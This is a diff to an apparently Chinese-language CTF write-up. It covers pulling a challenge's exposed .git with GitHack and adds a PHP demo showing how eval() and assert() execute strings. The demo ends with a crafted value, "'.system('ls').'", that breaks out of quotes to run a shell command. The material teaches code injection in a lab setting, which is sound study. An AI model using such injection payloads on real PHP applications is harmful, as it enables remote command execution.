@@ -199,4 +199,25 @@ URL中自动携带参数`id=1`, 将`id=1`改成`id=flag`, 自动跳回到`id=1`,
     python /Users/lixiaolong/tools/GitHack/GitHack.py http://111.198.29.45:54372/.git/
     ```
 
-审计源码发现`flag.php`为空, `index.php`中使用`strpos()`对`$page`校验`..`
+审计源码发现`flag.php`为空, `index.php`中使用`assert()`对`$page`校验`..`
+
+```php
+<?php
+$a = "abc";
+// abc, 字符串携带变量作为方法参数, 会被php语法解析
+echo "<p>$a</p>";
+// 1, 获取字符串第一次出现的位置
+echo strpos($a, 'bc');
+echo "<br>";
+// 1, eval把字符串当做代码执行, 字符串中的变量同样会被解析
+// 被解析后需要加上''
+eval("echo strpos('$a', 'bc');");
+echo "<br>";
+// assert也会把字符串当做代码执行, 字符串中的变量同样会被解析
+assert("strpos('$a', 'bc') === 1");
+echo "<p>ok</p>";
+// 构造恶意字符串, 截断''
+$a = "'.system('ls').'";
+assert("strpos('$a', 'bc') === 1");
+?>
+```
